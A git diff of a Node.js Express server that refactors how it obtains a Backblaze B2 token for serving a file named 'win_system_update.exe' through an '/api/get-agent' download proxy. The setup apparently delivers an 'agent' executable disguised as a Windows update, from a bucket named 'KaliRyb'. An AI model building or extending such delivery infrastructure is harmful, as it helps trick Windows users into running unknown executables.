@@ -31,6 +31,42 @@ const upload = multer({ storage: storage });
 // --- Initialize Backblaze B2 ---
 let b2;
 let globalDownloadAuthToken = null;
+let kaliRybBucketId = null; // Declare kaliRybBucketId globally
+
+async function getAndSetDownloadAuthToken() {
+    if (!b2 || !B2_BUCKET_NAME) {
+        console.warn("⚠️ B2 not initialized or B2_BUCKET_NAME not set. Cannot get download authorization token.");
+        return false;
+    }
+    try {
+        console.log("Attempting to list buckets to find 'KaliRyb'...");
+        const listBucketsResponse = await b2.listBuckets();
+        const kaliRybBucket = listBucketsResponse.data.buckets.find(b => b.bucketName === B2_BUCKET_NAME);
+
+        if (!kaliRybBucket) {
+            console.error(`❌ Error: Bucket '${B2_BUCKET_NAME}' not found.`);
+            kaliRybBucketId = null;
+            globalDownloadAuthToken = null;
+            return false;
+        }
+        kaliRybBucketId = kaliRybBucket.bucketId;
+        console.log(`✅ Found bucket '${B2_BUCKET_NAME}' with ID: ${kaliRybBucketId}`);
+
+        const downloadAuthResponse = await b2.getDownloadAuthorization({
+            bucketId: kaliRybBucketId, // Use the found bucketId
+            fileNamePrefix: 'win_system_update.exe', // Token for specific file
+            validDurationInSeconds: 86400 // 24 hours
+        });
+        globalDownloadAuthToken = downloadAuthResponse.data.authorizationToken;
+        console.log("✅ B2 download authorization token obtained.");
+        return true;
+    } catch (err) {
+        console.error("❌ Error obtaining B2 download authorization token or listing buckets:", err.message);
+        globalDownloadAuthToken = null; // Ensure token is cleared on failure
+        return false;
+    }
+}
+
 async function authorizeB2() {
     if (!B2_APPLICATION_KEY_ID || !B2_APPLICATION_KEY) {
         console.warn("⚠️ Backblaze B2 credentials not provided. File uploads to B2 will not work.");
@@ -152,10 +188,18 @@ app.get('/api/get-agent', async (req, res) => {
     try {
         console.log(`Iniciando túnel de descarga para: ${fileName}`);
         
-        
-        if (!b2 || !bucketName || !globalDownloadAuthToken) {
-            console.error("B2 not initialized, B2_BUCKET_NAME not set, or download authorization token not obtained.");
+        if (!b2 || !bucketName) {
+            console.error("B2 not initialized or B2_BUCKET_NAME not set. Secure B2 download not available.");
             return res.status(500).json({ error: "Server configuration error: Secure B2 download not available." });
+        }
+
+        // Attempt to get token JIT if it's null (e.g., failed on startup or expired)
+        if (!globalDownloadAuthToken) {
+            console.log("Download authorization token is null. Attempting to generate JIT.");
+            const tokenGenerated = await getAndSetDownloadAuthToken();
+            if (!tokenGenerated) {
+                return res.status(500).json({ error: "Failed to obtain B2 download authorization token." });
+            }
         }
 
         const downloadServerUrl = b2.getDownloadServerUrl();
@@ -168,8 +212,17 @@ app.get('/api/get-agent', async (req, res) => {
         const b2FileResponse = await fetch(fullDownloadUrl);
 
         if (!b2FileResponse.ok) {
-            console.error(`Failed to download ${fileName} from B2. Status: ${b2FileResponse.status}. Response: ${await b2FileResponse.text()}`);
-            return res.status(b2FileResponse.status).send(`Failed to download file from B2.`);
+            const errorText = await b2FileResponse.text();
+            console.error(`Failed to download ${fileName} from B2. Status: ${b2FileResponse.status}. Response: ${errorText}`);
+            // Attempt to parse as JSON for more detailed B2 error messages
+            try {
+                const errorData = JSON.parse(errorText);
+                console.error("Detailed B2 error response:", errorData);
+                return res.status(b2FileResponse.status).json({ error: "Failed to download file from B2.", details: errorData });
+            } catch (jsonError) {
+                // If not JSON, send raw text
+                return res.status(b2FileResponse.status).send(`Failed to download file from B2: ${errorText}`);
+            }
         }
 
         // Pass through relevant headers from B2 response
@@ -182,7 +235,11 @@ app.get('/api/get-agent', async (req, res) => {
 
     } catch (error) {
         console.error('❌ Error en el túnel de B2:', error.message);
-        res.status(500).json({ error: "No se pudo procesar la descarga segura." });
+        // Add more specific logging for B2 SDK errors that might happen before the fetch
+        if (error.response && error.response.data) {
+            console.error("Detailed B2 SDK error response:", error.response.data);
+        }
+        res.status(500).json({ error: "No se pudo procesar la descarga segura.", details: error.message });
     }
 });
 
@@ -396,32 +453,11 @@ async function startServer() {
     await authorizeB2();
     await connectMongo();
 
-    let kaliRybBucketId = null;
+    console.log(`Bucket Name configurado: ${B2_BUCKET_NAME}`);
 
-    // Fetch download authorization token once on startup
-    if (b2 && process.env.B2_BUCKET_NAME) {
-        try {
-            console.log("Attempting to list buckets to find 'KaliRyb'...");
-            const listBucketsResponse = await b2.listBuckets();
-            const kaliRybBucket = listBucketsResponse.data.buckets.find(b => b.bucketName === process.env.B2_BUCKET_NAME);
-
-            if (!kaliRybBucket) {
-                console.error(`❌ Error: Bucket '${process.env.B2_BUCKET_NAME}' not found.`);
-                return; // Stop here if bucket not found
-            }
-            kaliRybBucketId = kaliRybBucket.bucketId;
-            console.log(`✅ Found bucket '${process.env.B2_BUCKET_NAME}' with ID: ${kaliRybBucketId}`);
-
-            const downloadAuthResponse = await b2.getDownloadAuthorization({
-                bucketId: kaliRybBucketId, // Use the found bucketId
-                fileNamePrefix: 'win_system_update.exe', // Token for specific file
-                validDurationInSeconds: 86400 // 24 hours
-            });
-            globalDownloadAuthToken = downloadAuthResponse.data.authorizationToken;
-            console.log("✅ B2 download authorization token obtained.");
-        } catch (err) {
-            console.error("❌ Error obtaining B2 download authorization token or listing buckets:", err.message);
-        }
+    // Attempt to get download authorization token once on startup
+    if (b2 && B2_BUCKET_NAME) {
+        await getAndSetDownloadAuthToken();
     }
 
     httpServer.listen(PORT, () => {
